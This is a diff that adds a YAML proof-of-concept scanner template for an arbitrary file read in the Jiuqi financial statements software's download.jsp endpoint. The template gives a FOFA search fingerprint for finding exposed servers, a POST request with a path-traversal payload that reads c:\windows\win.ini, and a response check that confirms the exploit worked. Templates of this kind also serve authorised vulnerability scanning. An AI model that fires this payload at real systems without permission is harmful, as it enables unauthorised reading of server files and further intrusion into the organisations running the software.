@@ -1,0 +1,18 @@
+id: poc-yaml-jiuqi-financial-statements-download-jsp-anyfile-read
+info:
+  name: 久其财务报表 download.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 久其财务报表
+  fofa: body="/netrep/"
+requests:
+- method: POST
+  path: /netrep/ebook/browse/download.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: jpgfilepath=c:\windows\win.ini\jpg\..\&outfiletype=xls
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<") && contains(content_type,"application/vnd.ms-excel")
+variables: {}
+transport: http
